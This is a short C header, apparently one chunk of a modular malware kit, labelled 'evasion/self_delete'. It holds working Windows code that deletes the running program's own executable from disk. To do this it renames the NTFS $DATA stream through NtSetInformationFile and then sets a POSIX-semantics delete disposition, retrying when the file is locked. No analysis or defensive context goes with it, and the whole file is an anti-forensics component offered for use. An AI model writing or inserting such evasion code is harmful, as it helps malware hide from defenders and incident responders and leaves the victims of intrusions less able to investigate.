// chunk: evasion/self_delete
// depends: (none)
// provides: self_delete
// headers: windows.h
// note: Deletes own exe from disk via NTFS $DATA stream rename + POSIX delete. Retries if file is locked. No child processes.

#ifndef CHUNK_SELF_DELETE
#define CHUNK_SELF_DELETE

typedef struct { ULONG_PTR i1; ULONG_PTR i2; union { struct { DWORD o; DWORD oh; }; PVOID p; }; HANDLE h; } SD_IOSB;
typedef LONG (NTAPI *pfnNtSetInfo)(HANDLE, SD_IOSB*, PVOID, ULONG, ULONG);

static void self_delete(void) {
    WCHAR path[MAX_PATH];
    if (!GetModuleFileNameW(NULL, path, MAX_PATH)) return;

    pfnNtSetInfo NtSet = (pfnNtSetInfo)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationFile");
    if (!NtSet) return;

    struct {
        BOOLEAN ReplaceIfExists;
        HANDLE RootDirectory;
        ULONG FileNameLength;
        WCHAR FileName[16];
    } ri;
    memset(&ri, 0, sizeof(ri));
    ri.ReplaceIfExists = FALSE;
    ri.RootDirectory = NULL;
    ri.FileName[0] = L':';
    ri.FileName[1] = L'D';
    ri.FileName[2] = L'E';
    ri.FileName[3] = L'A';
    ri.FileName[4] = L'D';
    ri.FileName[5] = L'\0';
    ri.FileNameLength = 4 * sizeof(WCHAR);

    for (int attempt = 0; attempt < 5; attempt++) {
        HANDLE hFile = CreateFileW(path, DELETE | SYNCHRONIZE,
            FILE_SHARE_READ | FILE_SHARE_DELETE, NULL,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            Sleep(500);
            continue;
        }

        SD_IOSB iosb;
        memset(&iosb, 0, sizeof(iosb));
        LONG s = NtSet(hFile, &iosb, &ri, sizeof(ri), 10);
        CloseHandle(hFile);

        if (s != 0) {
            Sleep(500);
            continue;
        }

        hFile = CreateFileW(path, DELETE | SYNCHRONIZE,
            FILE_SHARE_READ | FILE_SHARE_DELETE, NULL,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) break;

        struct { ULONG Flags; } di;
        di.Flags = 0x03;
        memset(&iosb, 0, sizeof(iosb));
        NtSet(hFile, &iosb, &di, sizeof(di), 64);
        CloseHandle(hFile);
        break;
    }
}

#endif
